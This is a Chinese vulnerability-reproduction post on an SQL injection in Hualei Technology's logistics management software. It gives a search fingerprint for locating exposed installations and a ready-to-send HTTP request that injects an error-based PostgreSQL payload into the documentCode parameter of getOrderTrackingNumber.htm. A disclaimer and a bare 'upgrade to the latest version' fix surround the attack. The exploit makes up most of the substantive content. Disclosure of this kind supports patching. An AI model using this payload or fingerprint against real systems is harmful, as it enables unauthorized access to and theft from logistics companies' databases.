#  华磊科技物流SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-12 03:59  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 华磊科技物流SQL注入漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2ojGV6XqYssQubwB4iaJY8JSAflmYjiaYibjwF3BGKDNVxBWFic549U6IDrpvV7FCfrEVbX6GYZLjWOXnr4yPpDEpj9pQoXSY1kuQ/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0kFdR4nKpJuCtn0KU4DpcXNGoX1iaTUNAz57A511c2C8BIgicXOKuOkIicj8U2Smpq9lHYdVRqJib7n9xEUJibK5oN09CdfnLLWRag/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
****  
  
03  
  
—  
  
漏洞简介  
  
华磊科技物流（深圳华磊物流通信息科技有限公司）成立于2013年，是一家专注于为  
物流企业提供信息  
化  
解决方  
案的高科技企业。公司提供涵盖仓储管理、运输管理、国  
际货代、FBA头程物流、运单分销等模块的系统，支持多平台订单同步，实现物流  
全流程数字化管理  
。  
攻击者可通过构造恶意参数documentcode  
，注入SQL语句，执行任意SQL命令，获取数据库敏感信息或操控数据库  
。  
  
04  
  
—  
  
资产测绘  
```
body="l_c_bar"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0yhDjUIhWkgg4c8HTKe1a9qgSau9iakSdVVqZMGVnWjGSY1ibYI8j9DMiab8nyiaxSAJ6KmrE4lN2nDKC2TBB4MrSJXOrboefBzJ8/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /getOrderTrackingNumber.htm?documentCode=1%27and%0a1=user::integer-- HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=6CB5CC58CD9CCB79AE62A315B44A6CD5
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2L7fOFbzICakib9A5eQFMtXwvIyWJ6FvHKkn6DnJSudXQFanS2fPGiaSOGv35KpyVqEIxB5Te77TcOxzcdfC0qtFJabAPd19Sr4/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
